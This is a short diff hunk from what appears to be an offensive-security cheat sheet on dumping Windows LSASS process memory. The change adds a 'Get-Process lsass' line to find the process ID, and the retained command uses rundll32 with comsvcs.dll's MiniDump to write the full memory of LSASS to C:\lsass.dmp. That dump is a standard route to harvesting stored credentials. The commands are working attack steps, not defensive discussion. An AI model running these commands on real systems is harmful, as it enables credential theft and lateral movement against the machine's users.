@@ -126,8 +126,8 @@ A file called lsass.DMP is created and saved in:  C:\Users\loggedonusersdirector
 #### Rundll32.exe & Comsvcs.dll Method
 
 ```powershell
+Get-Process lsass
 
-c
 rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full 
 ```
 ```cmd
